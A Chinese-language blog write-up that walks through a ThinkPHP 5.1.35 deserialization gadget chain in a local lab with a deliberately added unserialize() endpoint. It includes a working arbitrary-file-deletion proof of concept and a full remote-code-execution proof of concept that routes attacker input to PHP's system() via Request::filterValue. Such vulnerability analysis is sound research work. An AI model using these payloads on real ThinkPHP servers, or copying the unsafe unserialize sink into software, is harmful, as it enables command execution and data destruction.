# Thinkphp5.1.x反序列化

## 环境

版本：Thinkphp5.1.35 + php7.3.4 +phpstorm

[避免xdebug断开连接](https://blog.csdn.net/qq_44836237/article/details/122324587)，在phpstudy的`设置`下的vhosts.conf加入如下代码

```
 IPCConnectTimeout 999999
 IPCCommTimeout 999999
 FcgidIOTimeout 999999　　
 FcgidConnectTimeout 999999
```

并且向application/index/controller/index.php中的index方法中添加如下代码：

```php
$str = base64_decode($_POST['payload']);
echo $str;
unserialize($str);
```

目的时构造一个触发反序列化的点。

## 反序列化

`析构函数__destruct()：当对象被销毁时会自动调用。`也是本次漏洞的入口点。
如下是一个简单的流程图：

![image-20220927111459419](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271115109.png)

其中有几个疑问点：
### 1、第二步中哪里调用了`__toString`方法？
再跟进`Conversion.php`中的`__destruct()`中的`$this->removeFiles();`方法
![image-20220927111952690](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271119741.png)

`__toString`:把类当作字符串使用时触发。
并且这里的`$filename`是由`$this->files`控制，`$this->files`是可以由我们控制的。
`->`用来引用对象的成员(属性与方法);
同时这里还存在另外一个漏洞点：

#### 删除任意文件

`@unlink`:删除文件

```php
<?php

namespace think\process\pipes;
class Windows
{
    private $files = [];

    public function __construct()
    {
        $this->files = ['0' => 'D:\phpstudy_pro\WWW\ThinkPhp\thinkphp5.1.35\Test.txt'];
    }
}

echo base64_encode(serialize(new Windows()));
```

此刻我们只需要找一个类存在`__toString`并且能够完整的构造整个链子。这时候我们找到了`Conversion.php`。

### 2、如何调用`__call`方法？

跟入`$this->toJson()`再跟入`json_encode($this->toArray(), $options);`的`$this->toArray()`。
着重注意这里：
![image-20220927113251059](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271132154.png)

这里`$this->append`是可控的。
`=>`：php中=>一般用作数组键名与元素的连接符。
例如：

```php
$arr = array(
'a'=>'123',
'b'=>'456'
);
foreach($arr as $key=>$val){
//$key是数组键名
//$val是数组键名对应的值
}
```

至此能进入`if`语句中。
进入`$this->getRelation`
![image-20220927113841516](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271138554.png)

`$name`为传入的`$key`。那么这里可以轻松构造，让返回值为空。
接着进入`$this->getAttr`中的`$this->getData($name);`
![image-20220927114504451](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271145509.png)

`array_key_exists`：不难理解就是一个判断`$name`，也就是传入的`key`是否存在于`$this->data`。
那么这里`$this->data`，我们是可以控制的。可以返回任意值。
回到`Conversion.php`中的`__toArray`。
**$relation->visible($name)**:这里的`$relation`可控，$name可控。只要传入一个存在`__call()`方法并且不存在`visible()`方法，即可完成触发指定类的`__call()`方法。
这里我们找到了`Request.php`

### 为什么`call_user_func_array`不能使用？

进入`Request.php`中的`__call()`方法。

![image-20220927115519645](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271155688.png)

`$method`为`visible`，但是可以控制`$this->hook`。这里的`$args`已经经过上面的判断这里必须为数组。
**array_unshift**：将`$this`，插入`$args`数组中，并且作为第一个元素。
所以这里不大可能构造出能够执行的命令。
**call_user_func_array**：[这里做了很好的解释](https://php.golaravel.com/function.call-user-func-array.html)，这里也关乎下面调用`Request.php`中`isAjax()`的构造。

### 为什么层层调试找到了isAjax

上面的**call_user_func_array**我们无法执行命令，我们可以寻找**call_user_func**。其也是能通过构造执行命令的。
同样找到了`Request.php`中的`filterValue`
![image-20220927121551996](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271215068.png)

这里又需要上一张流程图：
![image-20220927122653288](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271226365.png)

##### isAjax()

![image-20220927122815037](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271228079.png)

这里可以控制`param()`方法中的`$name`。

##### param

![image-20220927123039251](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271230391.png)

控制了传入的`input()`方法中的`$data`。

##### input

![image-20220927123311960](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271233049.png)
跟进一下这里的`$this->getFilter($filter, $default);`
![image-20220927124208821](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271242889.png)

跟进array_walk_recursive($data, [$this, 'filterValue'], $filter);
相当于调用了本类的filterValue方法，并且传入了data和filter方法。

## poc

```php
<?php

namespace think;
abstract class Model{
    protected $append = [];
    private $data = [];
    function __construct(){
        $this->append = ["xsw6"=>[]];
        $this->data = ["xsw6"=>new Request()];
    }
}

class Request{
    protected $filter;
    protected $hook = [];
    protected $config = ['var_ajax' => '',];

    public function __construct()
    {
        $this->filter = 'system';
        $this->hook = ['visible'=>[$this,"isAjax"]];
    }
}

namespace think\model;

use think\Model;

class Pivot extends Model
{
}

namespace think\process\pipes;

use think\model\Pivot;
use think\Process;
class Windows
{
    private $files;
    public function __construct()
    {
        $this->files = [new Pivot()];
    }
}
echo base64_encode((serialize(new Windows())));


```

同时这里讲一下为什么这么构造。
根据上面的分析我们调用了Conversion.php，但是我们要如何调用它呢？他是个trait并且不能实例化。
[**trait介绍**](https://blog.csdn.net/weixin_42748455/article/details/111168641)
通过理解我们可以知道寻找一个类use了`Conversion.php`即可，于是找到了`Model`类，但是他是个抽象类还是不能实例化，于是找一个继承类就行。于是找到了最终的`Pivot()`
![image-20220929150847679](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209291511491.png)

## 疑问

这里同时还有个疑问：我将poc对应的这个部分

    function __construct(){
        $this->append = ["xsw6"=>[]];
        $this->data = ["xsw6"=>new Request()];
    }
修改成为:

```
    function __construct(){
        $this->append = ["1"=>[]];
        $this->data = ["1"=>new Request()];
    }
```

最后发现触发无法成功。
调试了一下发现，在`调用Conversion.php的__toString`时
![image-20220927133416721](https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202209271334792.png)

获取不到对应的key。导致后续`getData()`中无法存在满足条件的判断，从而抛出异常。
